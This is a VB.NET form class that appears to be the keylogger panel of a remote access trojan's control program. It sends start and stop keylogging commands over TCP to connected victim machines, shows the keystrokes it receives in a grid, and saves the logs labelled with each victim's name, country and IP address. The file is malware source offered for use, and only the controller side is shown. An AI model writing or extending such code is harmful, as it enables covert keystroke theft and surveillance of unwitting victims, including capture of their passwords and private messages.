Imports System.ComponentModel

Public Class Keylogger

    Public Client As Net.Sockets.TcpClient

    Public classClient As sockets.Client

    Public Title As String = "null"

    Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
    Sub New()

        InitializeComponent()

        Me.Font = reso.f

    End Sub
    Private Sub SpyStyle()
        For Each gr As Button In BOXP.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As DataGridView In Me.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background

            '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        Next
        For Each gr As Panel In Me.Controls.OfType(Of Panel)()
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.ctxMenu.Renderer = New ThemeToolStrip

        DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f

        DGV0.DefaultCellStyle.Font = reso.f

        Me.DGV0.ContextMenuStrip = Me.ctxMenu

        Me.Icon = New Icon(reso.res_Path & "\Icons\win\19.ico")

        Me.Text = Title

        SpyStyle()

        SaveToolStripMenuItem.Visible = True

        SaveAsToolStripMenuItem.Visible = True

        Me.TOpacity.Interval = SpySettings.T_Interval

        Me.TOpacity.Enabled = True
    End Sub

    Private Sub Keylogger_Start_Click(sender As Object, e As EventArgs) Handles Keylogger_Start.Click

        If Not classClient Is Nothing Then

            classClient.Keylogg = True

            Dim objs As Object() = {Client, SecurityKey.KeysClient8 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & "(unknown)", Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

            Keylogger_Stop.Enabled = True
            Keylogger_Start.Enabled = False

        End If
    End Sub

    Private Sub Keylogger_Stop_Click(sender As Object, e As EventArgs) Handles Keylogger_Stop.Click

        If Not classClient Is Nothing Then

            classClient.Keylogg = False

            Dim objs As Object() = {Client, SecurityKey.KeysClient9 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger, Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

            Keylogger_Start.Enabled = True
            Keylogger_Stop.Enabled = False

        End If

    End Sub

    Private Sub Keylogger_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        If Not classClient Is Nothing Then

            classClient.Keylogg = False

            Dim objs As Object() = {Client, SecurityKey.KeysClient9 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger, Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If

    End Sub

    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        reso.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, tmpFolderUSER, "Keylogger",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "Keylogger", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})

    End Sub

    Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "Keylogger", "log", "null"})
        End If
        SaveAS.Dispose()
    End Sub
End Class